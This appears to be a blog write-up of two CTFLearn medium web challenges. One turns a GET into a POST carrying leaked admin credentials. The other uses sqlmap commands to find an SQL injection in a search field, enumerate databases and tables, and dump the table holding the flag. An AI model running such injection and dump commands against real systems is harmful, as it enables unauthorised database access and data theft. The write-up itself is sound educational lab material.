---
layout: post
permalink: /posts/ctflearn/web-medium
title: "CTFLearn write-up: Web (Medium)"
date: 2020-08-15 18:37
tags: ctflearn CTF web
description: "Welcome to another ctflearn write-up. Today, we are going to finish off the medium level web-based challenge"
---

Howdy there, welcome to another ctflearn write-up. Today, we are going to finish off the medium level web-based challenge. Without further ado, let's get started.

## 1) POST Practice

[Link: https://ctflearn.com/challenge/114](https://ctflearn.com/challenge/114)

For this task, you are required to play around with the HTTP-request header. By using the Burp suite, the request is originally in GET.

![burp](/assets/images/ctflearn/2020-08-15-web-medium/1.png)

Our objective is to change the request from GET to POST. If you look at the response, you should find the username and password for the POST request.

![burp response](/assets/images/ctflearn/2020-08-15-web-medium/2.png)

By sending the request to the repeater and change the request with the following.

```
POST /post.php HTTP/1.1
Host: 165.227.106.113
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

username=admin&password=71urlkufpsdnlkadsf
```

![post flag](/assets/images/ctflearn/2020-08-15-web-medium/3.png)

## 2) Prehashbrown

[Link: https://ctflearn.com/challenge/854](https://ctflearn.com/challenge/854)

This is another SQL injection challenge. First of all, register and login yourself. You will come across the following search bar.

![login](/assets/images/ctflearn/2020-08-15-web-medium/4.png)

This search bar is vulnerable to sqli. To make things easy, I capture the request header and saved as r.txt.

```
POST / HTTP/1.1
Host: 138.197.193.132:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.197.193.132:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Cookie: session=.eJwtzrERwzAIAMBdVLtAWCDwMjkQcElrx1Uuu6fJT_Cf9qgzr2c73uedW3u8oh0NVdNShiyl3MWRcAhG4FRmNQvupDjJuIYB7VyuFXuklJUvAy5z8M6046o1WIbmkgpP7xCGKg49xmKPKQTsgrIIQqlnjWxbu688_xmY7fsDJpIwUQ.XgoN7g.8npc5r-RdNRbhXE0vKTNozaJMPM
Connection: close
Upgrade-Insecure-Requests: 1

search=haha
```

After that, launch the sqlmap with the following command.

```
sqlmap -r r.txt --dbs --batch
```

![db](/assets/images/ctflearn/2020-08-15-web-medium/5.png)

keep enumerating the prehashbrown table with the following command.

```
sqlmap -r r.txt -D prehashbrown --table --batch
```

![table](/assets/images/ctflearn/2020-08-15-web-medium/6.png)

The flag is within the hashbrown table and we gonna dump all information from the table.

```
sqlmap -r r.txt -D prehashbrown -T hashbrown --column  --batch --dump
```

![hashbrown flag](/assets/images/ctflearn/2020-08-15-web-medium/7.png)

## Conclsuion

That's all for the short write-up on CTFlearn web in medium level. Until next time ;)
